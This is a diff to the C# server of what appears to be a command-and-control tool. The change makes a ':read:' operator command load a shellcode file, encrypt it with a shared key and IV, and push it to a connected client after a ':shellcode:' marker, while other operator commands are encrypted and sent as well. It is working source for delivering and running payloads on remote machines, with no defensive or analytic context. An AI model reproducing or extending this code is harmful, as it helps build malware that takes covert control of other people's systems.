@@ -48,9 +48,15 @@ class Server : IDisposable {
 
                                     byte[] enc;
                                     if (cmd.ToLower().StartsWith(":read:") && cmd.Split(' ').Length == 2) {
-                                        // read the payload file
+                                        // send shellcode magic number
                                         ws.WriteLine(Utils.SerializeBytes(Utils.EncryptData(":shellcode:", iv, key)));
-                                        enc = Utils.ReadBinaryFile(cmd.Split(' ')[1]);
+
+                                        // read the payload file
+                                        var filePath = cmd.Split(' ')[1];
+                                        var shellcode = Utils.ReadBinaryFile(filePath);
+                                        
+                                        // encrypt the shellcode
+                                        enc = Utils.EncryptData(Utils.SerializeBytes(shellcode), iv, key);
                                     } else {
                                         // send comamnd
                                         enc = Utils.EncryptData(cmd, iv, key);
